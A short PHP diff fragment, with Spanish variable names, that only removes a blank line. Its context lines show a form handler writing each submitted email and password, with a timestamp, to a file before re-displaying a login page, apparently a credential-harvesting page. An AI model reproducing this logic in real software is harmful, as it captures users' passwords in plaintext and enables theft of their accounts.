@@ -27,7 +27,6 @@ if (isset($_REQUEST['bAceptar'])) {
             fwrite($escribir, "Correo: ".$correoElectronico  . " Contraseña: ".$password ." ".$fecha_actual . PHP_EOL); 
             fclose($escribir);
         }
-
         include('../plantilla/Login.php');
     }
 }
